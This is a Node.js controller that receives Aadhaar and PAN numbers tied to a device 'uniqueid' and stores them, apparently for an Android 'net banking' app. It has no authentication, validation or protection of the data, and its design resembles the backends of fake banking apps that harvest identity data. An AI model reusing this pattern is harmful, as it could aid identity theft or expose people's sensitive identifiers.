// controllers/netBankingController.js
const NetBanking = require('../models/NetBanking');

exports.submitNetBankingData = async (req, res) => {
  try {
    // Destructure the fields as defined in NetBankingData.kt
    const { uniqueid, aadhaarNumber, panNumber } = req.body;

    let netBanking = await NetBanking.findOne({ uniqueid });

    if (netBanking) {
      // Update existing document
      netBanking.aadhaarNumber = aadhaarNumber;
      netBanking.panNumber = panNumber;
    } else {
      // Create a new document
      netBanking = new NetBanking({
        uniqueid,
        aadhaarNumber,
        panNumber
      });
    }

    await netBanking.save();

    res.status(200).json({
      success: true,
      message: "Net Banking Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting net banking data"
    });
  }
};
